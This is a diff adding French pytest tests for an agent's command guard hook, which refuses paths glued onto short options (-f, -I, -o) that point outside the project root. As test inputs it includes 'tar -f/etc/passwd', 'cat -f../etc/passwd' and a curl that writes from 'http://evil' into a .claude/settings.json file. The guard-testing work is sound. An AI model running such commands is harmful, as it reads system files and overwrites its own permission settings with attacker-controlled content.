@@ -1115,3 +1115,135 @@ class TestOptionsColleesChemin:
         c = charge("Bash", {"command": "echo bonjour"}, cwd=racine)
         exit_code, _ = run(garde, c, env=env_tmpdir)
         assert exit_code == 0
+
+# ── Tour 9 : R2 bornee a l index 2 + ouvertures Windows ──
+def test_refus_tar_option_agglutinee_f(tmp_path, racine, env_tmpdir):
+    """tar -f/etc/passwd : l'option -f agglutinee a /etc/passwd doit etre refusee (R2, index 2)."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "tar -f/etc/passwd"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_gcc_option_agglutinee_I(tmp_path, racine, env_tmpdir):
+    """gcc -I/usr/include x.c : l'option -I agglutinee a /usr/include doit etre refusee."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "gcc -I/usr/include x.c"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_curl_option_agglutinee_o(tmp_path, racine, env_tmpdir):
+    """curl -o.claude/settings.json http://evil : -o agglutine a un chemin hors racine."""
+    script = ecrire_garde(tmp_path, racine)
+    cible = str(racine.parent / ".claude" / "settings.json")
+    c = charge("Bash", {"command": "curl -o" + cible + " http://evil"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_cat_option_agglutinee_f(tmp_path, racine, env_tmpdir):
+    """cat -f../etc/passwd : -f agglutine a un chemin parent (../etc/passwd) -> refus."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "cat -f../etc/passwd"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_autorise_gcc_I_relatif(tmp_path, racine, env_tmpdir):
+    """gcc -Iinclude/sys x.c : NON-regression ; -I + chemin relatif sous racine doit etre autorise."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "include" / "sys").mkdir(parents=True)
+    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
+    c = charge("Bash", {"command": "gcc -Iinclude/sys x.c"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autorise_tar_f_relatif(tmp_path, racine, env_tmpdir):
+    """tar -fout/archive.tar : NON-regression ; -f + chemin relatif sous racine -> autorise."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "out").mkdir()
+    c = charge("Bash", {"command": "tar -fout/archive.tar"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autorise_gcc_I_src(tmp_path, racine, env_tmpdir):
+    """gcc -Isrc/include x.c : NON-regression ; -I + sous-arborescence de la racine -> autorise."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "src" / "include").mkdir(parents=True)
+    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
+    c = charge("Bash", {"command": "gcc -Isrc/include x.c"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autorise_tar_xzf_relatif(tmp_path, racine, env_tmpdir):
+    """tar -xzf archive.tar.gz : NON-regression ; cluster d'options courtes + chemin relatif OK."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "archive.tar.gz").write_bytes(b"")
+    c = charge("Bash", {"command": "tar -xzf archive.tar.gz"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autorise_gcc_I_point(tmp_path, racine, env_tmpdir):
+    """gcc -I. x.c : NON-regression ; -I + point (cwd explicite) -> autorise."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
+    c = charge("Bash", {"command": "gcc -I. x.c"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autorise_ls_la(tmp_path, racine, env_tmpdir):
+    """ls -la : NON-regression ; pas d'argument de chemin apres option, donc rien a valider hors racine."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "ls -la"}, cwd=racine)
+    code, _ = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def _ligne_ouvre_agglutine(script):
+    """Extrait la LIGNE qui construit OUVRE_AGGLUTINE dans le script genere.
+
+    Pourquoi cibler la ligne et non le source entier : chercher "[A-Za-z]:" ou un
+    backslash n'importe ou dans le fichier est NON-DETECTANT — ces motifs
+    apparaissent ailleurs (`_ressemble_chemin` contient deja "^[A-Za-z]:", et un
+    backslash figure dans presque toutes les lignes du template). Une mutation
+    retirant le motif de OUVRE_AGGLUTINE passait donc inapercue. Verifie par
+    mutation apres correction.
+    """
+    for ligne in script.read_text(encoding="utf-8").splitlines():
+        if "OUVRE_AGGLUTINE" in ligne and "re.compile" in ligne:
+            return ligne
+    raise AssertionError("ligne de construction de OUVRE_AGGLUTINE introuvable")
+
+
+def test_ouvre_agglutine_couvre_le_lecteur_windows(tmp_path, racine):
+    """Le motif d'ouverture agglutinee doit reconnaitre un lecteur Windows (C:...).
+
+    Non observable par execution sur POSIX : `C:x` y est un nom relatif legitime,
+    donc autorise a juste titre. La preuve porte sur la construction du motif.
+    """
+    ligne = _ligne_ouvre_agglutine(ecrire_garde(tmp_path, racine))
+    assert "[A-Za-z]:" in ligne, (
+        f"le motif d'ouverture agglutinee doit inclure le lecteur Windows ; ligne={ligne!r}"
+    )
+
+
+def test_ouvre_agglutine_couvre_le_backslash(tmp_path, racine):
+    """Le motif d'ouverture agglutinee doit inclure le separateur Windows (backslash).
+
+    Le backslash est construit par chr(92) * 2 : un backslash SEUL dans une classe
+    de caracteres echapperait le crochet fermant et rendrait le motif invalide.
+    """
+    ligne = _ligne_ouvre_agglutine(ecrire_garde(tmp_path, racine))
+    assert "chr(92)" in ligne, (
+        f"le motif d'ouverture agglutinee doit inclure le backslash ; ligne={ligne!r}"
+    )
